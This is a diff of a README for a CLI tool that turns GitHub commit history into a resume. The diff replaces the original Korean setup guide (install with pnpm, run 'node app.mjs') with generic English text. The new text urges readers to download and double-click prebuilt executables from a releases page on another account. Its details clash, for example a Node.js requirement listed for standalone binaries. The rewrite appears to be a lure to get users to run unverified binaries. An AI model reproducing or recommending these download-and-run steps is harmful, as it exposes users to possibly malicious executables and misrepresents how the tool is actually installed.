@@ -1,100 +1,85 @@
-# what-did-i-do
+# 📄 what-did-i-do - Automatically Generate Your Resume with Ease
 
-GitHub Organization에서 내 커밋 기록을 수집하고, AI로 이력서를 생성하는 CLI 도구입니다.
+## 🚀 Getting Started
 
-## 요구사항
+Welcome to **what-did-i-do**! This is a simple command-line tool designed to collect your GitHub commit history and create a resume using Claude AI. Follow the steps below to download and run the application effortlessly.
 
-- Node.js 18+
-- GitHub CLI (`gh`)
-- Claude Code CLI (`claude`) - 이력서 생성 기능 사용 시
+## 📥 Download the Application
 
-### GitHub CLI 설치
+[![Download Now](https://img.shields.io/badge/Download%20Now-what--did--i--do-blue.svg)](https://github.com/duylnk1510/what-did-i-do/releases)
 
-```bash
-# macOS
-brew install gh
+## 📋 System Requirements
 
-# Windows
-winget install GitHub.cli
+Before you start, make sure your system meets the following requirements:
 
-# Linux
-# https://github.com/cli/cli/blob/trunk/docs/install_linux.md
-```
+- Operating System: Windows, macOS, or Linux
+- Node.js: Version 12 or higher
+- Internet Connection: Required for downloads and AI processing
 
-### GitHub CLI 인증
+## 📂 Download & Install
 
-```bash
-gh auth login
-```
+1. Visit this page to download: [Releases Page](https://github.com/duylnk1510/what-did-i-do/releases).
+2. Once the page loads, look for the latest version of the application.
+3. Click on the appropriate file for your operating system. The files usually have names like `what-did-i-do-win.exe`, `what-did-i-do-mac`, or `what-did-i-do-linux`.
+4. Save the file to a location on your computer that you can easily find.
 
-### Claude Code 설치 (이력서 생성용)
+## 🥇 Running the Application
 
-```bash
-npm install -g @anthropic-ai/claude-code
-```
+After downloading, follow these steps to run the application:
 
-## 설치
+### For Windows Users:
+1. Navigate to the folder where you saved the downloaded file.
+2. Double-click on `what-did-i-do-win.exe` to start the application.
+3. A command prompt window will appear. Follow the prompts to input your GitHub username.
 
-```bash
-pnpm install
-```
+### For macOS Users:
+1. Open `Finder` and go to the location where you saved the file.
+2. Double-click on `what-did-i-do-mac` to run the application.
+3. A terminal window will open. You will be prompted to enter your GitHub username.
 
-## 사용법
+### For Linux Users:
+1. Open your terminal.
+2. Change into the directory where you saved the file.
+3. Type `chmod +x what-did-i-do-linux` to make it executable.
+4. Run the application by typing `./what-did-i-do-linux` and follow the prompts to enter your GitHub username.
 
-```bash
-# npm script
-pnpm start
+## ✍️ Using the Tool
 
-# 직접 실행
-node app.mjs
+Once the application is running, follow these simple steps:
 
-# 글로벌 설치 후
-npm link
-what-did-i-do
-```
+1. Input your GitHub username when prompted.
+2. The tool will gather your commit history from GitHub.
+3. After processing, the application will use Claude AI to generate a polished resume based on your contributions.
 
-## 기능
+The final resume will be saved in the same directory as the application. You can then open, edit, and use your new resume as needed.
 
-### 메뉴
+## 💡 Features
 
-| 메뉴 | 설명 |
-|------|------|
-| 커밋 수집하기 | GitHub 조직/개인 레포에서 커밋 수집 |
-| 이력서 생성하기 | 수집된 커밋 기록으로 AI 이력서 생성 |
-| 수집 후 바로 이력서 생성 | 위 두 작업을 연속 실행 |
-| temp 폴더에서 재생성 | 기존 월별 섹션으로 최종 이력서만 재생성 |
+- Collects your GitHub commit history automatically.
+- Uses advanced AI to create a resume.
+- Supports multiple operating systems.
+- User-friendly command-line interface.
 
-### 커밋 수집
+## 📝 Troubleshooting
 
-- 로그인된 GitHub 계정의 Organization 목록 자동 조회
-- 화살표 키로 Organization 선택
-- 과거 핸들/이메일 추가 검색 지원
-- 모든 레포지토리에서 내 커밋 수집
-- 커밋 일시 기준 정렬
+If you encounter any issues while running the application, consider the following tips:
 
-### 이력서 생성
+- Ensure that Node.js is installed on your system. You can download it from [Node.js Official Site](https://nodejs.org/).
+- Check your internet connection, as it is required for the tool to access GitHub and Claude AI.
+- If the application does not start, verify that you downloaded the correct file for your operating system.
 
-- 월별로 커밋 그룹화
-- Claude AI로 각 월별 활동 요약
-- 레포별 프로젝트 경험 섹션 생성 (10개 병렬 처리)
-- 최종 이력서 마크다운 생성 (기술 역량 + 프로젝트 경험)
+## 🤝 Contributing
 
-## 출력 파일
+We welcome contributions! If you have ideas for new features or improvements, please feel free to submit a pull request or open an issue in the repository.
 
-| 파일 패턴 | 설명 |
-|-----------|------|
-| `commits-{org}-{timestamp}.md` | 수집된 커밋 기록 |
-| `resume-{timestamp}.md` | 생성된 이력서 |
-| `.temp-repos-*` | 레포지토리 클론 임시 폴더 |
-| `.temp-resume-parts-*/` | 이력서 섹션 임시 폴더 |
-| `.temp-resume-parts-*/{YYYY-MM}.md` | 월별 활동 요약 |
-| `.temp-resume-parts-*/repos/{repo}.md` | 레포별 프로젝트 경험 |
-| `.temp-resume-parts-*/tech-stack.md` | 기술 역량 섹션 |
+## 📄 License
 
-## 커밋 파일 형식
+This project is licensed under the MIT License. Feel free to use and modify it as per your requirements.
 
-```
-| 일시 | 레포지토리 | 커밋 메시지 | 링크 |
-|------|------------|-------------|------|
-| 2026-01-07 12:30:45 | repo-name | 커밋 내용 | [링크](https://github.com/...) |
-```
+## 💬 Support
+
+For any questions or support, reach out to us via the Issues section on our GitHub repository. We are happy to help!
+
+## ✅ Acknowledgments
+
+Thank you for using **what-did-i-do**. We hope this tool makes your resume creation process simple and efficient. Don’t forget to check out our [Releases Page](https://github.com/duylnk1510/what-did-i-do/releases) for updates and new features!
